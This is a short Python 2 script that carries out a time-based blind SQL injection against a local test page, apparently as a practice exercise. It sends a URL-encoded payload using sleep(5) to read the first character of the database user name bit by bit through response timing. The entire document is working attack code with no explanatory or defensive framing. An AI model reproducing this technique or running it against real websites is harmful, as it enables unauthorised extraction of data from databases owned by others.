import requests
import time
import threading
bins = ''
for i in range(1,8):
    url = 'http://127.0.0.1/sqltest.php?id=1%20and%20(select%20if%20((substr(bin(ascii(substr(user(),1,1))),{num},1))=0,sleep(5),1))'
    payload = url.format(num=i)
    starttime = time.time()
    get = requests.get(payload)
    # print get.url
    endtime = time.time()
    if endtime - starttime > 4:
        print '0'
        bins += '0'
    else:
        print '1'
        bins += '1'
print bins
print chr(int(bins,2))     
